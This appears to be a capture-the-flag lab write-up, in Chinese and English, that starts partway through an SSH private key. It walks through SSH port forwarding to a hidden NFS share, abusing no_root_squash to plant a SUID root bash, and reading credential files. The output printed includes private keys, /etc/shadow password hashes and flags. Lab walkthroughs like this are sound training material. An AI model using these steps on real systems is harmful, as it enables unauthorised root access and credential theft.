qx74pwqseJzYUsGqyfxIgCxFUtP31gjB5KXO54qqWRyNqVebdjvisi8cbcZOnlGXTFEsyW
uyccGbLYg8k1WiNb1cDhlxRRpR0XCHiQbYvvrl9mSaPpumTlZaaHZ0VIWi0Zicnxt57ya6
7vIp5QcFHmOlAG27IOqnz8Mz2Rn6dWEaU64JphALyyFyT44U/Kfyj+rdKNeCuuy98OYIEY
zMPJVwbwZmGgpzQCVSyzcn0lFp4RPdTzJjpDQ8tXNOgw94Liw2ZAj1kRFi/7I771x5XmRY
bXqLnTp/NCjby1TUQFZxLlbOZnHUbQAAAAMBAAEAAAGBAJgpMzQleIaD98szWvj8Yw791P
bVLrU0sx32XJvshFPfKklcnm281yhq9ee68d6gcgZ/gPZzv55QAGFRk/q30LxKk2pxK+wF
1NsGP/s6cQGmAmq99SaUxV8mYgLS59nyqXMxV1pPtVvI/YEXHd0ETRx0eHy8b7Tkxj8EoY
iPXfaWS8gv8LhrFg0gdxfYvm2TfREtvAOOIQHygbU2vl05P1cbhcPaj6o+UU0K7llovh0F
/EnX/vyjHuyzDLoaTe6t7e5R+6oyqdzZUVnoAYKzTFDmjPeVIJGZ7GxCAfCtZV9n0FJWVP
S6qtccwik/6IZFiWUphkUiJwO0KSQeZ72feZ+DaT/RKoEZ5BdPV+Selq6ruvw6Ji+KVNXf
7XqBCObh9JT+WV/JLUUI/KRSRNr1hvSMqrSIZMhGGZLkMf7csyr6yFR/1PlJoMYZe4RYrk
XRhF2NwqvZ2dHaYz3sH0Sr7Jc8ZgwUjX5LwDoOSIIMs0O1MokP2VT28Y2vSBq6FNtiAQAA
AMBE4foS3IKTmJEUkEgRjZtqifXI+n3NI+RggDMMSdjZzUDylhevTuuEQLWK7JC4rLD64d
clVQEh9eAO0kjAOUoo1FSXkhLScZGzAVTJzZM2srFWhK6PKBqVjTDGLLDJUE9Uiluu9dNp
99ZCQdY5VlowT8kza3tOVVi8qUGXyKEGrDfI4uQaWofy2wCYt9y7Gz7pP/q1PudbLduEXP
BSEIC6Dh52t6KHBq5K8EoFi1+zrhyMCTZIQEec3H4NXK1LHTcAAADBAO/Fs2EylkGXJmLM
KfbuqvDWSLddSeajrcouL1iyofhrKH1U1RmBU6rTTYiXpWS6zpg46hx0y4yDo5KQjxyIlQ
4rsmRQF99RtiyP4rjycgaXZ2f/m5cGTaLH7omju5g4fTz5vpwKbr4EJI0QRJqpU1OpsBkQ
JpMkSzN0Mw77kTJ341e2yDGxmWoBTo6xYU4VnrIQA3d70TTgJEJTxezY/8GPF4TmGtzd19
TTZJY5E6snLe77+QjasHLsHHlHGYySUQAAAMEA5VgsRvGomZ9IA61z2v8/zNO6bnvlCNqh
2wNDzkqrWwBhbXLOVc7iomTWy1K+8We6nxoQNBnZUY4aQi2zdtobgI4hJAynP2kWrw6Az5
1BdNYqo7N0eDscwfUHbaMsScwuwMQDFODLJ8pS8QS8G7Slb5dHdJa5m1JwCCKWYrYXsK/G
azAN0sgAFc4dzbfCfaZqiYe0F6J9YW47zlxkDMk6KsP/Efg1iTe+0cntq8hAU5wD8RI7Wj
j2sg/piHZoFZ1dAAAAF3BhcmFkb3hAaXAtMTAtNDgtMTU4LTYxAQID
-----END OPENSSH PRIVATE KEY-----
```

本地端口转发（Local Port Forwarding）本质上是在你的电脑和远程服务器之间建立一条加密隧道，并把远程网络里某个被防火墙藏起来的服务，“搬”到你自己的电脑上，让你像访问本地程序一样去访问它。

我们可以用“大楼保安与任意门”来形象地理解这个过程：

* **当前困境：** 目标服务器是一栋大楼，大楼门口有严格的保安（防火墙）。大楼深处的机密档案室（NFS 服务，端口 2049 和 111）是不对楼外的人开放的。你从外部直接去敲档案室的门，保安会直接把你轰走。
* **突破口：** 大楼对外开放了一个接待处（SSH 服务，端口 22），并且你马上就要拿到这个接待处的合法通行证（通过 FTP 写入 SSH 公钥获取登录权限）。
* **本地端口转发的作用：** 当你登录接待处（SSH）后，你跟前台说：“我们在我的房间和你的办公室之间拉一根专用管道吧。” 然后你在**你自己的电脑**上开了一扇“任意门”（本地监听端口）。当你把手伸进这扇任意门时，前台会把你的手从大楼内部伸出来，直接推开机密档案室的门。因为动作发生在大楼内部，门口的保安（防火墙）完全看不见，也管不着。

在终端里，这个魔法指令的结构是这样的：

```bash
ssh -L [本地任意门端口]:[目标最终IP]:[目标最终端口] [目标用户名]@[SSH服务器IP]

```

结合你目前的实战场景，如果你成功拿到了 `paradox` 的 SSH 权限，你可以这样建立隧道：

```bash
ssh -L 2049:127.0.0.1:2049 paradox@目标服务器IP

```

**这句话翻译给 SSH 听就是：**
“通过 `paradox` 账号连接目标机器。连接成功后，在**我自己的攻击机**上开一个 `2049` 端口。以后只要有数据发到我本地的 `2049` 端口，你就顺着 SSH 隧道把数据偷偷运进目标机器，然后以目标机器的身份，把数据交给它自己的 `127.0.0.1:2049`（本地 NFS 服务）。”

隧道建立后，目标机器那坚不可摧的 NFS 服务，就等于直接运行在你自己的电脑上了。此时你在攻击机上执行挂载命令时，目标 IP 就不再是那台有防火墙的服务器了，而是**你自己**：

```bash
sudo mount -t nfs -o port=2049 127.0.0.1:/home/james /mnt

```

```
[paradox@ip-10-48-158-61 .ssh]$ systemctl list-units --type=service --state=running
<systemctl list-units --type=service --state=running
UNIT                       LOAD   ACTIVE SUB     DESCRIPTION                            
firewalld.service          loaded active running firewalld - dynamic firewall daemon    
...
httpd.service              loaded active running The Apache HTTP Server                 
...                
nfs-idmapd.service         loaded active running NFSv4 ID-name mapping service          
nfs-mountd.service         loaded active running NFS Mount Daemon                       
...
rpc-statd.service          loaded active running NFS status monitor for NFSv2/3 locking.
rpcbind.service            loaded active running RPC Bind                               
...                
sshd.service               loaded active running OpenSSH server daemon                  
sssd.service               loaded active running System Security Services Daemon        
...
vsftpd.service             loaded active running Vsftpd ftp daemon                      

LOAD   = Reflects whether the unit definition was properly loaded.
ACTIVE = The high-level unit activation state, i.e. generalization of SUB.
SUB    = The low-level unit activation state, values depend on unit type.
```

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ssh -i id_rsa -L 2049:127.0.0.1:2049 paradox@10.48.158.61
The authenticity of host '10.48.158.61 (10.48.158.61)' can't be established.
ED25519 key fingerprint is: SHA256:18WMJxDadr79jI/eHKaMMLgRKWSOMUxtNLFbBJjVKrg
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.48.158.61' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Sun Oct  4 12:21:33 2026
[paradox@ip-10-48-158-61 ~]$ 
```

```
┌──(root㉿kali)-[~]
└─# ss -tunlp
Netid       State        Recv-Q       Send-Q              Local Address:Port                Peer Address:Port       Process                                  
udp         UNCONN       0            0                         0.0.0.0:40691                    0.0.0.0:*           users:(("openvpn",pid=2916,fd=3))       
tcp         LISTEN       0            128                     127.0.0.1:2049                     0.0.0.0:*           users:(("ssh",pid=171021,fd=5))         
tcp         LISTEN       0            128                         [::1]:2049                        [::]:*           users:(("ssh",pid=171021,fd=4))  
```

```
┌──(root㉿kali)-[~]
└─# mount -t nfs 127.0.0.1:/home/james /mnt/nfs_share
Created symlink '/run/systemd/system/remote-fs.target.wants/rpc-statd.service' → '/usr/lib/systemd/system/rpc-statd.service'.
mount.nfs: mounting 127.0.0.1:/home/james failed, reason given by server: No such file or directory
```

 `reason given by server: No such file or directory` 这个报错其实是一个“好消息”。它证明了你的挂载请求已经成功穿过了本地的 2049 端口隧道，并且**目标机器的 NFS 服务端真实地收到了你的请求，并给出了回应**。这说明网络层面已经完全打通了。

那么，为什么服务端会说找不到这个目录呢？

这需要我们回顾一下你之前看到的 `/etc/exports` 配置文件里的一个小细节。

还记得这条规则吗？
`/home/james *(rw,fsid=0,sync,no_root_squash,insecure)`

这里的关键点，藏在那个不起眼的 **`fsid=0`** 参数里。

### `fsid=0` 的“空间魔法”

在现代 NFS 服务（特别是 NFSv4）中，`fsid=0` 是一个非常特殊的标记。它的作用是创建一个“伪根文件系统”（Pseudo-root）。

简单来说，`fsid=0` 告诉 NFS 服务器：“**请把 `/home/james` 这个目录，认作是你对外提供共享时的绝对根目录（`/`）。**”

让我们对比一下两个视角：

* **服务端的真实物理视角：** 存在一个目录树 `/` -> `home` -> `james`
* **服务端的 NFS 虚拟视角（因为 fsid=0）：** `/home/james` 变成了最顶层的 `/`

### 你的报错是怎么来的？

当你使用命令 `mount -t nfs 127.0.0.1:/home/james /mnt/nfs_share` 去请求挂载时，NFS 服务器会用它的**虚拟视角**去寻找这个路径。

也就是说，NFS 服务器会在它的虚拟根目录（也就是真实的 `/home/james`）下面，去寻找一个名为 `home/james` 的子文件夹。它实际上去硬盘里找的物理路径变成了：`/home/james/home/james`。

因为不存在这种“套娃”一样的子目录，所以服务端非常诚实地回复你：对不起，没有这个文件或目录（No such file or directory）。

### 继续下去的思考方向

既然你现在知道了，NFS 服务器已经用“空间魔法”把 `/home/james` 变成了它的虚拟根目录（`/`）。

那么，在你不改变服务端配置的前提下，**你本地的 `mount` 命令中，冒号后面的请求路径应该改成什么**，才能精准地敲开这个虚拟根目录的大门呢？

```
┌──(root㉿kali)-[~]
└─# mount -t nfs 127.0.0.1:/ /mnt/nfs_share             

```

```
┌──(root㉿kali)-[~]
└─# ls /mnt/nfs_share
user.flag
┌──(root㉿kali)-[~]
└─# cat /mnt/nfs_share/user.flag 
thm{3693fc86661faa21f16ac9508a43e1ae}
```

```
┌──(root㉿kali)-[~]
└─# cp /bin/bash /mnt/nfs_share/bash

┌──(root㉿kali)-[~]
└─# ls -al /mnt/nfs_share/bash   
-rwxr-xr-x 1 root root 1417520 Oct  4 10:17 /mnt/nfs_share/bash
                           
┌──(root㉿kali)-[~]
└─# chmod u+s /mnt/nfs_share/bash
                         
┌──(root㉿kali)-[~]
└─# ls -al /mnt/nfs_share/bash   
-rwsr-xr-x 1 root root 1417520 Oct  4 10:17 /mnt/nfs_share/bash
```

Under the `/mnt/nfs_share` in our kali linux, which corresponding to the `/home/james` on the target machine, we found ssh key pairs under `.ssh` so that we can use ssh to login as james and execute the SUID bash.

```
┌──(root㉿kali)-[~]
└─# ls -al /mnt/nfs_share/.ssh
total 12
drwx------ 2 kali kali   61 Nov  7  2020 .
drwx------ 3 kali kali  124 Oct  4 10:17 ..
-rw------- 1 kali kali  581 Nov  7  2020 authorized_keys
-rw------- 1 kali kali 2610 Nov  7  2020 id_rsa
-rw-r--r-- 1 kali kali  581 Nov  7  2020 id_rsa.pub
```

```
┌──(root㉿kali)-[~]
└─# cat /mnt/nfs_share/.ssh/authorized_keys                        
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhIxoVPVYzINfT4KimO0q4jk5p3RT7Qfib3uz9HXv8NpNG55UYY7PtzvK7d9TUwBcO9l5IOT/PRY0HJnC0w4/VjmiKqiMj7bUWQUKE4WCgmI0gCezuwyOb16TrdafSc0QILxQf1lxZrA2/5/tQcWc3Gc0f0phQQTSpHCcbwdt2GmQf8edTcbGP+u2RnE+FPgqjdE9gU0kcDD41ivCc0gaY5tKJYWpTfqIGmx4yJ+MRqMCtzZ6owuLzXPoVHOvq2RrkPfotgKf1o4l22teDU+kR861EQXTRP2dcSIlxl/t8jUkrQyAwgDGjmm1F5NY1AmEPVcN+DwhdzP7SAIlm1BF56aQnrfxDaoUII08f1H4HYXMiQoxs81br+d+SSUNafMMn/Z9FS5SDxu+0hvK9/jXc2whmoyzncOORbIb/vprYEsXHYYy3z/EA7BlI5vqVR0VnrgZ1oXeV5yqK7zF93ss7n06qPJ4x0HUTsKxlYrDZmLi3nlMImqD1vVkQN3KBhos= james@localhost.localdomain
```

```
┌──(root㉿kali)-[~]
└─# cat /mnt/nfs_share/.ssh/id_rsa.pub     
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDhIxoVPVYzINfT4KimO0q4jk5p3RT7Qfib3uz9HXv8NpNG55UYY7PtzvK7d9TUwBcO9l5IOT/PRY0HJnC0w4/VjmiKqiMj7bUWQUKE4WCgmI0gCezuwyOb16TrdafSc0QILxQf1lxZrA2/5/tQcWc3Gc0f0phQQTSpHCcbwdt2GmQf8edTcbGP+u2RnE+FPgqjdE9gU0kcDD41ivCc0gaY5tKJYWpTfqIGmx4yJ+MRqMCtzZ6owuLzXPoVHOvq2RrkPfotgKf1o4l22teDU+kR861EQXTRP2dcSIlxl/t8jUkrQyAwgDGjmm1F5NY1AmEPVcN+DwhdzP7SAIlm1BF56aQnrfxDaoUII08f1H4HYXMiQoxs81br+d+SSUNafMMn/Z9FS5SDxu+0hvK9/jXc2whmoyzncOORbIb/vprYEsXHYYy3z/EA7BlI5vqVR0VnrgZ1oXeV5yqK7zF93ss7n06qPJ4x0HUTsKxlYrDZmLi3nlMImqD1vVkQN3KBhos= james@localhost.localdomain
```

```
┌──(root㉿kali)-[~]
└─# cat /mnt/nfs_share/.ssh/id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

```
┌──(root㉿kali)-[~]
└─# cp /mnt/nfs_share/.ssh/id_rsa /home/kali/Downloads/id_rsa_james
```

```
┌──(root㉿kali)-[~]
└─# ssh -i /home/kali/Downloads/id_rsa_james james@10.48.158.61
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Last login: Wed Nov 18 18:26:00 2020 from 192.168.170.145
[james@ip-10-48-158-61 ~]$ whoami
james
[james@ip-10-48-158-61 ~]$ id
uid=1000(james) gid=1000(james) groups=1000(james)
[james@ip-10-48-158-61 ~]$ pwd
/home/james
[james@ip-10-48-158-61 ~]$ ls -al
total 1404
drwx------. 3 james james     124 Oct  4 15:17 .
drwxr-xr-x. 4 root  root       34 Nov  8  2020 ..
-rwsr-xr-x  1 root  root  1417520 Oct  4 15:17 bash
lrwxrwxrwx. 1 root  root        9 Nov  8  2020 .bash_history -> /dev/null
-rw-r--r--. 1 james james      18 Nov  8  2019 .bash_logout
-rw-r--r--. 1 james james     141 Nov  8  2019 .bash_profile
-rw-r--r--. 1 james james     312 Nov  8  2019 .bashrc
drwx------. 2 james james      61 Nov  8  2020 .ssh
-rw-------. 1 james james      38 Nov 17  2020 user.flag
[james@ip-10-48-158-61 ~]$ /home/james/bash
/home/james/bash: /lib64/libtinfo.so.6: no version information available (required by /home/james/bash)
/home/james/bash: /lib64/libc.so.6: version `GLIBC_2.33' not found (required by /home/james/bash)
/home/james/bash: /lib64/libc.so.6: version `GLIBC_2.36' not found (required by /home/james/bash)
/home/james/bash: /lib64/libc.so.6: version `GLIBC_2.38' not found (required by /home/james/bash)
/home/james/bash: /lib64/libc.so.6: version `GLIBC_2.34' not found (required by /home/james/bash)
```

Seems like the latest kali bash doesn't work on the old target machine, so maybe we can try to use old version bash on the target.

```
[james@ip-10-48-158-61 ~]$ rm /home/james/bash
rm: remove write-protected regular file '/home/james/bash'? yes
[james@ip-10-48-158-61 ~]$ cp /bin/bash .
[james@ip-10-48-158-61 ~]$ ls -al bash
-rwxr-xr-x 1 james james 1219248 Oct  4 15:41 bash
```

And we add SUID and change the owner and group owner for this bash on our kali ssh mounted folder

```
┌──(root㉿kali)-[~]
└─# ls -al /mnt/nfs_share/bash
-rwxr-xr-x 1 kali kali 1219248 Oct  4 10:41 /mnt/nfs_share/bash
                            
┌──(root㉿kali)-[~]
└─# chown root:root /mnt/nfs_share/bash

┌──(root㉿kali)-[~]
└─# ls -al /mnt/nfs_share/bash         
-rwxr-xr-x 1 root root 1219248 Oct  4 10:41 /mnt/nfs_share/bash

┌──(root㉿kali)-[~]
└─# chmod u+s /mnt/nfs_share/bash
                             
┌──(root㉿kali)-[~]
└─# ls -al /mnt/nfs_share/bash   
-rwsr-xr-x 1 root root 1219248 Oct  4 10:41 /mnt/nfs_share/bash
```

Back to the james ssh session, we execute the SUID bash

```
[james@ip-10-48-158-61 ~]$ ls -al bash
-rwsr-xr-x 1 root root 1219248 Oct  4 15:41 bash
```

And we successffully do the privilege escalation

```
[james@ip-10-48-158-61 ~]$ /home/james/bash -p
bash-4.4# whoami
root
bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) groups=1000(james)
```

```
bash-4.4# cat /etc/shadow
root:$6$9/L0npr3tOBrxXqd$uqqxUhreUY4RhAjEjQJTm6n1XTPQ7zTLCdW4kq1/FEesHFRqUSVF3kp.uais/Yk99axuxLBVtdZEEV6/aojwy/::0:99999:7:::
bin:*:18358:0:99999:7:::
daemon:*:18358:0:99999:7:::
adm:*:18358:0:99999:7:::
lp:*:18358:0:99999:7:::
sync:*:18358:0:99999:7:::
shutdown:*:18358:0:99999:7:::
halt:*:18358:0:99999:7:::
mail:*:18358:0:99999:7:::
operator:*:18358:0:99999:7:::
games:*:18358:0:99999:7:::
ftp:*:18358:0:99999:7:::
nobody:*:18358:0:99999:7:::
dbus:!!:18574::::::
systemd-coredump:!!:18574::::::
systemd-resolve:!!:18574::::::
tss:!!:18574::::::
polkitd:!!:18574::::::
sssd:!!:18574::::::
sshd:!!:18574::::::
chrony:!!:18574::::::
rngd:!!:18574::::::
james:$6$abYKNGpI6M1IZhWK$y04LK4UOfz1cB6gUpr4qaePM3tmFxbrdHiokBzfCXTmA7w8i3U8FPoixNSonhyofrA9p9tSYf8vW1A3cq9Ef1/:18583:0:99999:7:::
rpc:!!:18574:0:99999:7:::
rpcuser:!!:18574::::::
apache:!!:18574::::::
nginx:!!:18574::::::
paradox:$6$nMYGH5SipRopm1NM$PXOSN5.HiRtzCpc51C21VZ9HnwLg3J95hmzQ5O9RTTwpsLRzlfSh7BPh.9MSeBwO6q5FMtyR4QDXkRASdu0xs/:18574:0:99999:7:::
```

Find the root flag

```
bash-4.4# find / -name "root*" 2>/dev/null
bash-4.4# cat /root/root.flag
thm{a4f6adb70371a4bceb32988417456c44}
```

Find the web flag:
```
bash-4.4# find -name "web*" 2>/dev/null
bash-4.4# cat /usr/share/httpd/web.flag
thm{0ae72f7870c3687129f7a824194be09d}
```

